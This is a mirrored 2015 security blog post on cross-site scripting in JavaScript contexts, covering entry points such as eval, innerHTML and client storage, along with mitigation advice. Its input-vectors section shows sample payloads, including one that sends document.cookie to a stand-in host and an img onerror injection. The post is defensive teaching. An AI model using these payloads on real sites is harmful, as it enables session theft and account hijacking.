---
layout: post
title: "The Rise of JavaScript XSS and Practical Mitigation Techniques"
date: 2015-10-01
---

*Originally published on the [Software Secured blog](https://web.archive.org/web/20220816224109/https://www.softwaresecured.com/the-rise-of-javascript-xss-and-practical-mitigation-techniques/). Mirrored here for posterity.*

Cross Site Scripting (XSS) is listed by OWASP Top 10 as #3 on the list. If you tried to decipher Cross-site Scripting and understand its mitigation, you will soon discover that understanding the different HTML contexts is key to understanding proper mitigations against Cross-site Scripting. One of the toughest contexts is the JavaScript context since injected code is much closer to an execution context than any other context.

With the rise of JavaScript stacks, this problem is only growing, and more possibilities for successful execution of malicious code is increasing.

## XSS Types

There are three main types of XSS:

**Stored XSS** happens when user input is stored on the target server, and the victim is able to retrieve the stored data in an unsafe way.

**Reflected XSS** happens when user input is returned immediately to the user and the input is not validated or made safe to render by the browser.

**DOM Based XSS** happens when XSS becomes possible based on DOM-based manipulation. Think of it as a dormant payload, which becomes active only when the DOM manipulates it in certain ways.

## Common XSS Attacks

- **Cookie theft / account hijacking** — exploit XSS to steal session information and impersonate the user
- **Keylogging** — receive key press events on the targeted web page from other users
- **Phishing** — create a URL with an XSS payload that captures session info
- **Access browser history and clipboard contents**
- **Control of the browser**

## Input-Based Attack Vectors

### JavaScript Inputs

In JavaScript itself there are only a few entry points for XSS.

The first is `eval`. **Don't use eval. It's considered evil.** Eval will execute whatever string is given to it in a new context.

Next, don't use anything that will take a string as arguments and execute said string. This is considered an implicit eval. The function constructor, `setTimeout`, `setInterval` can all take a string as an argument.

```javascript
// BAD - if evaluated, this sends cookies to an attacker
var stringFunc = '(new XMLHttpRequest()).open("GET", ' +
  '"http://www.example.org/example.txt?c=" + document.cookie, true).send();';
eval(stringFunc);
new Function(stringFunc)();
setTimeout(stringFunc, 1000);
setInterval(stringFunc, 1000);
```

### DOM Inputs

This is probably the most important attack vector. The key here is to programmatically create DOM nodes and append them to the DOM when we want to add content instead of inserting HTML directly into the document.

On the **DO NOT use** list:

- `element.innerHTML`, `element.outerHTML`
- `document.write()`, `document.writeln()`
- `element.setAttribute()` — dangerous attributes include: `href`, `src`, `onclick`, `onblur` etc

```javascript
// vulnerable innerHTML
container.innerHTML = req.responseText;
```

If `req.responseText` contained `<img src=x onerror="alert(document.cookie)" />`, the JavaScript code will be executed. The same sort of attack will work with `document.write`.

Generally, this means avoiding `.html()` and `innerHTML` and instead using `.append()`, `.prepend()`, and `.textContent` when adding content.

### URL Inputs

Getting values from parameters and query strings client side has to be done properly to avoid pitfalls. This input into a JavaScript application is a high priority on an attacker's list.

### Client Side Storage

Remember that data from cookies, `localStorage`, `sessionStorage` and the like, cannot be trusted, as it's vulnerable to user manipulation.

```javascript
localStorage.setItem('alert', 'alert(document.cookie)');
eval(localStorage.getItem('alert'));
```

### postMessage

The browser cross domain messaging system should be untrusted as a malicious user could man-in-the-middle your web application.

### Web Workers

Web Workers can be used to perform denial of service attacks against the target, so it's best to not allow users to create them. Since Web Workers use the `postMessage` API, any communication with the web worker should be untrusted.

### JSON

Anywhere you accept JSON input there is the possibility of user manipulation. Using `JSON.parse` is the preferred method since it won't execute what it's given. Despite this, given bad input, the parse function can crash your application.

## Mitigation Techniques

### Using JavaScript Code Safely

The fix for implicit eval functions:

```javascript
setTimeout(function() { console.log("safe"); }, 1000);
setInterval(function() { console.log("safe"); }, 1000);
```

Use strict mode:

```javascript
function strictModeOn() {
  'use strict';
  // eval not allowed
  console.log('no eval');
}
```

Use a JavaScript linter (JSHint or ESLint) that checks code for the bad APIs.

### Using JSON Safely

```javascript
function parseJSON(obj, reviver, callback) {
  var json;
  try {
    json = JSON.parse(obj, reviver);
  } catch(err) {
    return callback(err);
  }
  callback(null, json);
}
```

### Using URLs Safely

1. URL encode the desired URL
2. JavaScript encode the result of step 1

### Using the DOM Safely

For DOM input from the user we need to validate what is being given to us on input. For outputting to the DOM it is always necessary to HTML encode the data. This removes the threat of nasty characters that could give an attacker an execution scope.

Another possible solution is to use a tool from Google called [google-caja](https://developers.google.com/caja). It sanitizes your HTML, CSS, and JavaScript so that you can safely embed third party code into your site.

## Summary

Hopefully this has been an informative post into the world of XSS and how JavaScript and the DOM play into an attacker's hand.

Happy coding!

## References

- [OWASP DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
- [OWASP HTML5 Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Excess XSS](https://excess-xss.com/)
